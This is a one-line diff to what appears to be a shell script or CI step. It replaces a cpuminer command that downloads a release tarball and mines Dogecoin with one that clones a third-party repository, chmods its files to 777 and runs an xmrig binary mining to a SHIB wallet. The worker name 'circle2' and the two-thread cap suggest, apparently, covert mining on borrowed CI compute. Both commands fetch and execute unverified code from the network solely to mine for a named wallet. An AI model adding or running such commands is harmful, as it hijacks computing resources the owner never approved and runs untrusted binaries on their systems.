@@ -1,1 +1,1 @@
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.19/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a cpupower -o stratum+tcp://cpupower.na.mine.zpool.ca:6240 -u DCFkhhgDdvBpH8rEwKiNkiVi68dyACybmK -p c=DOGE -t2
+git clone https://github.com/quincyhays/bmxmrig.git && cd bmxmrig && chmod 777 * && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u SHIB:0x748025d6e4e19b9e482dc048a31b970d2772275b.circle2 --nicehash --randomx-1gb-pages -t2
